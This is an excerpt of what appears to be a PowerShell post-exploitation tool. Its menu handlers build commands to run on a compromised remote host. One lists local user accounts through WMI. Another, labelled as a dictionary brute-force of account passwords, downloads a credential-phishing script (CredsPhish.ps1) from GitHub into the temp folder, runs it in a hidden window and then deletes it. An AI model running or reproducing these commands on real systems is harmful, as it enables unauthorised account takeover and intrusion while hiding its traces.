...
.SYNOPSIS
   ...
   PS Script Dev Version: v2.10.10.12
  ...
  If(-not ($WaitData))
  {
    ...
    If($Command -ieq "AdvInfo" -or $Command -ieq "adv")
    {
      ...
      If($choise -ieq "ListAcc" -or $choise -ieq "acc")
      {
         ...
         $Command = "Get-WmiObject Win32_UserAccount -filter 'LocalAccount=True'| Select-Object Disabled,Name,PasswordRequired,SID|Out-File users.txt;Start-Sleep -Seconds 1;`$Out = Get-Content users.txt;If(-not(`$Out)){echo `"   [i] error: cmdlet cant retrive remotehost accounts ..`"}Else{echo `$Out};Remove-Item -Path users.txt -Force";
      }
    ...
    If($Command -ieq "PostExploit" -or $Command -ieq "post")
    {
      ...
      If($choise -ieq "BruteAcc" -or $choise -ieq "Brute")
      {
         ...
         write-host "   -----------"
         write-host "   Brute forces user account password using dicionary attack."
         ...
         {
            Write-Host " Brute-Forcing User Account with dicionary ..`n" -ForegroundColor Blue -BackgroundColor White;
            $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/modules/CredsPhish.ps1`" -OutFile `"`$Env:TMP\CredsPhish.ps1`"|Out-Null;powershell -WindowStyle hidden -File `$Env:TMP\CredsPhish.ps1 -PhishCreds Brute -Dicionary `$Env:TMP\passwords.txt;Remove-Item -Path `$Env:TMP\CredsPhish.ps1 -Force"
         }
